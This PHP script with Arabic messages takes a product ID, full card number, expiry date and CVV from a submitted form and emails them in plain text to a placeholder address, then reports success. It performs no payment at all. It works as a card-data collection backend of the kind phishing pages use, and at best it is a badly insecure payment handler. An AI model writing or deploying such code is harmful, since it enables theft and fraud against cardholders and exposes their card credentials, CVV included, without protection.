<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $productId = $_POST["productId"];
    $cardNumber = $_POST["cardNumber"];
    $expiryDate = $_POST["expiryDate"];
    $cvv = $_POST["cvv"];

    $to = "your_email@example.com"; // Replace with your actual email address
    $subject = "بيانات Visa لمنتج رقم: " . $productId;
    $message = "بيانات بطاقة Visa المقدمة:\n\n";
    $message .= "رقم المنتج: " . $productId . "\n";
    $message .= "رقم البطاقة: " . $cardNumber . "\n";
    $message .= "تاريخ الانتهاء: " . $expiryDate . "\n";
    $message .= "رمز التحقق (CVV): " . $cvv . "\n";
    $message .= "\n**تحذير: هذه البيانات حساسة ويجب التعامل معها بحذر.**\n";

    $headers = "From: webmaster@yourdomain.com\r\n"; // Replace with a valid "From" address
    $headers .= "Reply-To: webmaster@yourdomain.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send the email
    $mail_success = mail($to, $subject, $message, $headers);

    if ($mail_success) {
        echo "تم إرسال بيانات Visa عبر البريد الإلكتروني بنجاح.";
        // You might want to redirect the user to a thank you page here
        // header("Location: thank_you.html");
        // exit();
    } else {
        echo "حدث خطأ أثناء إرسال البريد الإلكتروني. يرجى المحاولة مرة أخرى.";
    }
} else {
    // If someone tries to access this script directly
    echo "لا يمكن الوصول إلى هذه الصفحة مباشرة.";
}
?>